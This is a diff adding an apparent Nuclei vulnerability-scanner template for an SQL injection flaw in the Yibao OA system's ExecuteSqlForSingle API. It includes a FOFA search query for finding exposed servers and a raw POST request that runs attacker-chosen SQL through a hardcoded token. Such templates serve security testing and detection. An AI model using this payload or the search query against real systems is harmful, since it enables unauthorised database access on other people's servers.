@@ -1,0 +1,33 @@
+id: ExecuteSqlForSingle_sql
+info:
+  name: ExecuteSqlForSingle_sql
+  author: mike
+  severity: info
+  description: 易宝OA系统是一种专门为企业和机构的日常办公工作提供服务的综合性软件平台，具有信息管理、 流程管理 、知识管理（档案和业务管理）、协同办公等多种功能。易宝OA系统ExecuteSqlForSingle接口存在SQL注入漏洞。
+  reference: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: title="欢迎登录易宝OA系统"
+http:
+  - raw:
+      - |
+        POST /api/system/ExecuteSqlForSingle HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Host: {{Hostname}}
+        Content-Length: 100
+        Content-Type: application/x-www-form-urlencoded
+
+        token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "data"
